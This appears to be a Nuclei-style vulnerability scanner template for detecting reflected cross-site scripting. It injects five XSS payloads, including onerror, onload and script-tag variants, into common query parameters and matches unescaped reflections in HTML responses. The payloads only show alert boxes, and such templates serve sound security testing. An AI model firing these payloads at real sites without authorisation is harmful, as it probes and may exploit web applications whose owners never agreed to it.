id: THENAWABX_FOUND_XSS
info:
  name: Nawab-Confirmed-XSS
  author: thenawabx
  severity: high

http:
  - pre-condition:
      - expr: "queue.has_params"

    payloads:
      xss_payloads:
        - "<video><source/onerror=confirm(1)>"
        - "<body/onpageshow=alert?.(1)>"
        - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
        - "<script>alert(\"Hacked\")</script>"
        - "<ScRipt>alert(\"Hacked\")</ScRipt>"

    fuzzing:
      - part: query
        type: replace
        mode: multiple
        keys:
          - "q"
          - "id"
          - "search"
          - "name"
          - "msg"
          - "query"
          - "keyword"
          - "text"
        fuzz:
          - "{{xss_payloads}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "<video><source/onerror=confirm(1)>"
          - "<body/onpageshow=alert?.(1)>"
          - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
          - "<script>alert(\"Hacked\")</script>"
          - "<ScRipt>alert(\"Hacked\")</ScRipt>"
        condition: or

      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body
        negative: true
        words:
          - "example"
          - "tutorial"
          - "W3Schools"
          - "placeholder"
          - "how to"
          - "learning"
        condition: or

    extractors:
      - type: regex
        part: body
        regex:
          - "(?i)<script>alert.*?</script>"
          - "(?i)<video><source/onerror=.*?>"
